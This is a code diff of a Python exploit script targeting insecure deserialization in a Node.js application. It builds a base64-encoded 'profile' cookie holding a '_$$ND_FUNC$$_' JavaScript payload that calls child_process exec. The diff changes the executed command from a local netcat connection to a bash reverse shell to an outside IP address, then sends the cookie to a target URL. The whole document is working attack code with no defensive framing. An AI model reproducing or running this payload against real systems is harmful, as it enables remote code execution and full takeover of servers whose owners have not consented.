@@ -16,7 +16,7 @@ payload = (
             "['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));" +
             "console.log('still inside');" +
             "const { exec } = require('child_process');" +
-            "exec('nc 127.0.0.1 1234', { shell: '/bin/bash' }, (error, stdout, stderr) => {" +
+            "exec('bash -i >& /dev/tcp/144.122.139.40/1234 0>&1', { shell: '/bin/bash' }, (error, stdout, stderr) => {" +
                 "if (error) {" +
                     "console.error('Exec error: ' + error);" +
                     "return;" +
@@ -30,12 +30,10 @@ code = "_$$ND_FUNC$$_" + payload
 
 string = '{"username":"hasan", "exec": "' + code + '"}'
 cookie = {'profile': base64.b64encode(bytes(string, 'utf-8')).decode("utf-8")}
-print(cookie, '\n')
+print(cookie)
 try:
-    print('Sending payload')
     response = requests.get(url, cookies=cookie).text
-    print('Payload sent')
     print(response)
 except requests.exceptions.RequestException as e:
-    print('Oops! Error:', e)
+    print('Oops!')
     sys.exit(1)
